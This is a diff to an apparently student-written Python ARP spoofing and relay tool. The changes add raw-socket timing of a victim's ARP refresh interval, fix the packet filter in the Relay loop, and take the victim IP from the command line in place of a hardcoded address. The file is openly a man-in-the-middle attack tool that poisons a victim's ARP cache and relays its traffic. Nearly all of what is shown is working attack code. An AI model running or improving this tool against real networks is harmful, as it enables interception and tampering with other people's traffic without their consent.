@@ -8,6 +8,7 @@ from os import popen
 import re
 import subprocess
 import time
+from sys import argv
 from binascii import hexlify, unhexlify
 from multiprocessing import Process
 from socket import *
@@ -64,7 +65,7 @@ class ARP:
         self.gateway_ip = self._get_gateway_ip()
         self.name, self.ip, self.mac = self._get_my_interface_info()
         self.target_arp_refresh_interval = self.calc_arp_refresh()
-        print(self.target_arp_refresh_interval)
+        print("Done. %f" % self.target_arp_refresh_interval)
         self.victim_mac = self._get_mac(self.victim_ip)
         print("Get Victim's MAC address")
         self.gateway_mac = self._get_mac(self.gateway_ip)
@@ -91,14 +92,28 @@ class ARP:
         """
         print("Calculate Victim's ARP table Refresh interval")
 
-        self._get_mac(self.victim_ip)
-        ft = time.time()  # first time
-        self._get_mac(self.victim_ip)
-        st = time.time()  # second time
+        time_list = list()
 
-        print("Calc Done.")
+        self.send_arp(ARP_REQUEST_OP)
 
-        return st - ft
+        with socket(AF_PACKET, SOCK_RAW, htons(0x0003)) as s:
+            s.bind((self.name, SOCK_RAW))
+            while True:
+                if len(time_list) == 2:
+                    break
+                ether, ip = self.get_headers(s.recvfrom(4096))
+
+                ip_data = self.analysis_header(ip)
+
+                # if not ARP, Go away
+                if ether[2] != ARP_TYPE_ETHERNET_PROTOCOL:
+                    continue
+
+                elif ip_data['src_ip'] == self.victim_ip and ip_data['dst_ip'] == self.gateway_ip:
+                    time_list.append(time.time())
+
+        # After get time
+        return time_list[1] - time_list[0]
 
     @staticmethod
     def _get_gateway_ip():
@@ -291,7 +306,7 @@ class Relay:
             ip_header = ARP.analysis_header(ah_hex)
 
             # 내가 날리는 ARP 패킷이면 SKIP
-            if ah_hex[5] == ARP_TYPE_ETHERNET_PROTOCOL:
+            if eh_hex[2] == ARP_TYPE_ETHERNET_PROTOCOL:
                 continue
 
             # 만약 dst_ip 가 Gateway ip 이면서
@@ -315,8 +330,7 @@ class Relay:
 
 def main():
     # victim_ip = input("Victim IP: ")
-    victim_ip = '192.168.0.42'
-    arp = ARP(victim_ip)
+    arp = ARP(argv[1])
 
     r = Relay(arp)
     r.run()
@@ -330,4 +344,8 @@ def main():
 
 
 if __name__ == '__main__':
-    main()
+    if len(argv) != 2:
+        print("Usage: %s [victim_ip]" % argv[0])
+        exit()
+    else:
+        main()
